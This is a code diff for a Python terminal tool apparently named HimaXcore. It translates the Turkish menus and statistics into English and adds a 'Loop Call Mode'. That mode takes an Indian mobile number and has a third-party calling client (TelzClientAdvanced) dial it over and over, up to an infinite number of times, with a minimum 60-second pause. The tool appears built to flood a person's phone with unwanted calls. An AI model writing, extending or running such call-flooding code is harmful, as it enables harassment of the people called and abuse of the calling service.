-        print(f"\n{Fore.CYAN}{'─'*55}")
-        print(f"{Fore.GREEN}Basarili: {basarili}")
-        print(f"{Fore.RED}Basarisiz: {basarisiz}")
-        
-        self.genel_istatistikler['toplam_arama'] += basarili + basarisiz
-        self.genel_istatistikler['basarili_arama'] += basarili
-        self.genel_istatistikler['basarisiz_arama'] += basarisiz
-        
-        input(f"\n{Fore.CYAN}Devam etmek icin ENTER...")
-    
-    def _ayarlar_menu(self):
+
+        print(f"\n{Fore.CYAN}{'─' * 55}")
+        print(f"{Fore.GREEN}Successful: {successful}")
+        print(f"{Fore.RED}Failed: {failed}")
+
+        self.general_stats['total_calls'] += successful + failed
+        self.general_stats['successful_calls'] += successful
+        self.general_stats['failed_calls'] += failed
+
+        input(f"\n{Fore.CYAN}Press ENTER to continue...")
+
+    def _looped_call(self):
+        self.ui.show_banner()
+        print(f"\n{Fore.CYAN}{'─' * 55}")
+        print(f"{Fore.YELLOW}Loop Call Mode")
+        print(f"{Fore.CYAN}{'─' * 55}")
+
+        number = input(f"{Fore.WHITE}Enter Indian number (example: {Fore.YELLOW}+91 98765 43210{Fore.WHITE}): ").strip()
+        if not number:
+            print(f"{Fore.RED}Number cannot be empty!")
+            time.sleep(1)
+            return
+
+        number = self.normalize_indian_number(number)
+        if not number.startswith('+91'):
+            print(f"{Fore.RED}Please enter a valid Indian mobile number with +91 prefix.")
+            time.sleep(1)
+            return
+
+        repeat_input = input(f"{Fore.WHITE}How many times? (0 = infinite, default 10): ").strip() or "10"
+        if repeat_input.lower() in ["infinite", "inf"]:
+            repeat_count = 0
+        else:
+            try:
+                repeat_count = int(repeat_input)
+                if repeat_count <= 0:
+                    print(f"{Fore.RED}Repeat count must be greater than zero.")
+                    time.sleep(1)
+                    return
+            except ValueError:
+                print(f"{Fore.RED}Invalid repeat count.")
+                time.sleep(1)
+                return
+
+        delay_input = input(f"{Fore.WHITE}Delay between calls in seconds (minimum 60, default 60): ").strip() or "60"
+        try:
+            delay_seconds = float(delay_input)
+            if delay_seconds < 60:
+                delay_seconds = 60
+                print(f"{Fore.YELLOW}Minimum delay is 60 seconds. Using 60s.")
+        except ValueError:
+            print(f"{Fore.RED}Invalid delay value.")
+            time.sleep(1)
+            return
+
+        print(f"\n{Fore.CYAN}Looping call on: {number}")
+        print(f"{Fore.YELLOW}Press Ctrl+C to stop anytime.")
+
+        try:
+            attempt = 1
+            while True:
+                if repeat_count > 0 and attempt > repeat_count:
+                    break
+
+                self.ui.typewriter_text(f"\nAttempt {attempt}: calling {number}", 0.02, Fore.CYAN)
+
+                client = TelzClientAdvanced()
+                try:
+                    client.get_auth_list()
+                    client.start_device()
+                    client.button_status_check()
+                    client.validate_phone_number(number, "IN")
+
+                    rate_result = self.rate_limiter.check(number)
+                    allowed = rate_result is True or (isinstance(rate_result, tuple) and rate_result[0])
+
+                    if allowed:
+                        client.start_call(number)
+                        self.ui.show_status("Loop call", "success", f"Attempt {attempt} sent")
+                    else:
+                        remaining = rate_result[1] if isinstance(rate_result, tuple) else self.settings['waiting_time']
+                        self.ui.show_status("Loop call", "warning", f"Rate limited: {remaining:.0f}s")
+                except Exception as e:
+                    self.ui.show_status("Loop call", "error", str(e)[:60])
+
+                if repeat_count > 0 and attempt >= repeat_count:
+                    break
+
+                actual_wait = max(int(self.rate_limiter.waiting_time), int(delay_seconds))
+                box_width = 42
+                top = f"{Fore.MAGENTA}{Style.BRIGHT}╔{'═' * (box_width - 2)}╗"
+                bottom = f"{Fore.MAGENTA}{Style.BRIGHT}╚{'═' * (box_width - 2)}╝"
+                label = f"{Fore.WHITE}HimaXcore Timer"
+
+                print(f"\n{top}")
+                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.WHITE}{label.center(box_width - 2)}{Fore.MAGENTA}{Style.BRIGHT}║")
+                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.CYAN}{' ' * 2}Waiting for next call...{Fore.MAGENTA}{Style.BRIGHT}{' ' * max(0, box_width - 26)}║")
+                print(f"{bottom}")
+
+                for count in range(actual_wait, 0, -1):
+                    timer_line = f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.CYAN} Next call in {count:02d}s {Fore.MAGENTA}{Style.BRIGHT}{' ' * max(0, box_width - 26)}║"
+                    print(f"\r{timer_line}", end="", flush=True)
+                    time.sleep(1)
+
+                print(f"\r{Fore.MAGENTA}{Style.BRIGHT}╔{'═' * (box_width - 2)}╗", flush=True)
+                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.GREEN}{' Next call starting now '.center(box_width - 2)}{Fore.MAGENTA}{Style.BRIGHT}║")
+                print(f"{Fore.MAGENTA}{Style.BRIGHT}╚{'═' * (box_width - 2)}╝{Style.NORMAL}")
+                attempt += 1
+
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}Loop stopped by user.")
+
+        input(f"\n{Fore.CYAN}Press ENTER to continue...")
+
+    def _settings_menu(self):
         while True:
-            self.ui.banner_goster()
+            self.ui.show_banner()
             print(f"{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
             print(f"║                                                      ║")
-            print(f"║  {Fore.YELLOW}[1] {Fore.WHITE}Bekleme Suresi: {Fore.GREEN}{self.ayarlar['bekleme_suresi']} saniye")
-            print(f"║  {Fore.YELLOW}[2] {Fore.WHITE}Debug Modu: {Fore.GREEN}{self.ayarlar['debug_modu']}")
-            print(f"║  {Fore.YELLOW}[3] {Fore.WHITE}Ana Menüye Dön                                    ║")
+            print(f"║  {Fore.YELLOW}[1] {Fore.WHITE}Wait Time: {Fore.GREEN}{self.settings['waiting_time']} seconds")
+            print(f"║  {Fore.YELLOW}[2] {Fore.WHITE}Debug Mode: {Fore.GREEN}{self.settings['debug_mode']}")
+            print(f"║  {Fore.YELLOW}[3] {Fore.WHITE}Back to Main Menu                                 ║")
             print(f"║                                                      ║")
             print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")
-            
-            secim = input(f"{Fore.YELLOW}Seçiminiz (1-3): {Fore.WHITE}").strip()
-            if secim == "1":
-                yeni_sure = input(f"{Fore.WHITE}Yeni bekleme süresi (sn): ").strip()
-                if yeni_sure.isdigit():
-                    self.ayarlar['bekleme_suresi'] = int(yeni_sure)
-                    self.rate_limiter.bekleme_suresi_degistir(yeni_sure)
-            elif secim == "2":
-                self.ayarlar['debug_modu'] = not self.ayarlar['debug_modu']
-            elif secim == "3":
+
+            selection = input(f"{Fore.YELLOW}Your choice (1-3): {Fore.WHITE}").strip()
+            if selection == "1":
+                new_time = input(f"{Fore.WHITE}New wait time (seconds, minimum 60): ").strip()
+                try:
+                    new_time_value = int(new_time)
+                    if new_time_value < 60:
+                        new_time_value = 60
+                        print(f"{Fore.YELLOW}Minimum wait time is 60 seconds. Using 60s.")
+                    self.settings['waiting_time'] = new_time_value
+                    self.rate_limiter.change_wait_time(new_time_value)
+                except ValueError:
+                    print(f"{Fore.RED}Invalid value.")
+            elif selection == "2":
+                self.settings['debug_mode'] = not self.settings['debug_mode']
+            elif selection == "3":
                 break
 
-    def _istatistik_goster(self):
-        self.ui.banner_goster()
-        gecen_sure = datetime.now() - self.genel_istatistikler['baslangic_zamani']
-        print(f"{Fore.CYAN}📊 Sistem İstatistikleri")
-        print(f"{Fore.CYAN}{'─'*55}")
-        print(f"{Fore.WHITE}Çalışma Süresi: {Fore.YELLOW}{gecen_sure.seconds} saniye")
-        print(f"{Fore.WHITE}Toplam Arama: {Fore.YELLOW}{self.genel_istatistikler['toplam_arama']}")
-        print(f"{Fore.WHITE}Başarılı Arama: {Fore.GREEN}{self.genel_istatistikler['basarili_arama']}")
-        print(f"{Fore.WHITE}Başarısız Arama: {Fore.RED}{self.genel_istatistikler['basarisiz_arama']}")
-        print(f"{Fore.WHITE}API İstekleri: {Fore.BLUE}{self.genel_istatistikler['api_istekleri']}")
-        input(f"\n{Fore.CYAN}Devam etmek için ENTER...")
+    def _show_statistics(self):
+        self.ui.show_banner()
+        elapsed = datetime.now() - self.general_stats['start_time']
+        print(f"{Fore.CYAN}📊 System Statistics")
+        print(f"{Fore.CYAN}{'─' * 55}")
+        print(f"{Fore.WHITE}Running Time: {Fore.YELLOW}{elapsed.seconds} seconds")
+        print(f"{Fore.WHITE}Total Calls: {Fore.YELLOW}{self.general_stats['total_calls']}")
+        print(f"{Fore.WHITE}Successful Calls: {Fore.GREEN}{self.general_stats['successful_calls']}")
+        print(f"{Fore.WHITE}Failed Calls: {Fore.RED}{self.general_stats['failed_calls']}")
+        print(f"{Fore.WHITE}API Requests: {Fore.BLUE}{self.general_stats['api_requests']}")
+        input(f"\n{Fore.CYAN}Press ENTER to continue...")
 
-    def _cikis(self):
-        self.ui.banner_goster()
-        self.ui.animasyonlu_yaz("Sistemden çıkılıyor... Güle güle!", 0.03, Fore.MAGENTA)
-        self.aktif = False
+    def _exit(self):
+        self.ui.show_banner()
+        self.ui.typewriter_text(f"{HIMAXCORE_TAG} signed out... Goodbye!", 0.03, Fore.MAGENTA)
+        self.active = False
         sys.exit(0)
 
+
 if __name__ == "__main__":
-    motor = AramaMotoru()
-    motor.baslat()                 
+    engine = CallEngine()
+    engine.start()
